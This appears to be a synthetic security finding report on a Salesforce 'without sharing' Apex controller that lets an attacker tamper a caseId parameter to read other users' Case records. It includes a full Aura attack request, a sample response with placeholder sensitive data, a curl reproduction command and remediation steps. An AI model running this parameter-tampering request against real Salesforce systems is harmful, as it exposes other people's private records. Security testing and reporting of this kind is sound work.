# Security Analysis Report
**System:** ShopGrid Marketplace API (Salesforce-Integrated)
**Domain:** E-Commerce / Marketplace
**Example ID:** SF-0053
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BAC — Pattern 2.4 | Privilege escalation via parameter tampering on `CaseController.getCaseDetails` — attacker reads any e-commerce Case record |

---

## Finding 1 — BAC: Privilege Escalation via Parameter Tampering on Case Object (Pattern 2.4)

### Summary
The Apex controller `CaseController` on ShopGrid Marketplace API (`097ae4f9.lightning.force.com`) is declared `without sharing`, bypassing OWD=Private on the Case object. Per §5.0 Pattern 2.4, the client-controlled `caseId` parameter allows privilege escalation — an attacker tampers `caseId` to read any victim's Case record, bypassing ownership checks. Case records in an e-commerce/marketplace system may contain order disputes, customer PII, and financial data.

**Pattern:** 2.4 — Privilege escalation via parameter tampering (BAC)
**Affected controller:** `c.CaseController.getCaseDetails`
**Affected endpoint:** `POST https://097ae4f9.lightning.force.com/aura`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://097ae4f9.lightning.force.com/aura
Authorization: Bearer 00D097AE4F9!AR097ae4f9...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00D097AE4F9!AR097ae4f9...

message={"actions":[{"id":"1;a","descriptor":"c.CaseController.getCaseDetails","callingDescriptor":"UNKNOWN",
"params":{"caseId":"001E4F9","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}
&aura.token=undefined
```

**Response — Victim Case Record Returned**
```json
{
  "actions": [{ "id": "1;a", "state": "SUCCESS", "returnValue": { "records": [{
    "Id": "001E4F9", "Name": "Victim Case Record", "OwnerId": "005VICTIM",
    "InternalNotes__c": "CONFIDENTIAL: internal review notes",
    "SensitiveData__c": "SSN: 000-81-4981"
  }] }, "error": [] }]
}
```

### Steps to Reproduce
```bash
SESSION="00D097AE4F9!AR097ae4f9..."
curl -s -X POST "https://097ae4f9.lightning.force.com/aura" \
  -H "Authorization: Bearer $SESSION" -H "Content-Type: application/x-www-form-urlencoded" -H "X-SFDC-Session: $SESSION" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.CaseController.getCaseDetails","callingDescriptor":"UNKNOWN","params":{"caseId":"001E4F9","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'
# Vulnerable: state: SUCCESS, OwnerId: 005VICTIM, SensitiveData__c: SSN: 000-81-4981
# Secure: state: ERROR — INSUFFICIENT_ACCESS
```

### Remediation
1. `public with sharing class CaseController { ... }`
2. `WHERE Id = :caseId AND OwnerId = :UserInfo.getUserId()` + `WITH SECURITY_ENFORCED`
3. Server-side `fields` allowlist. Validate `aura.token`.
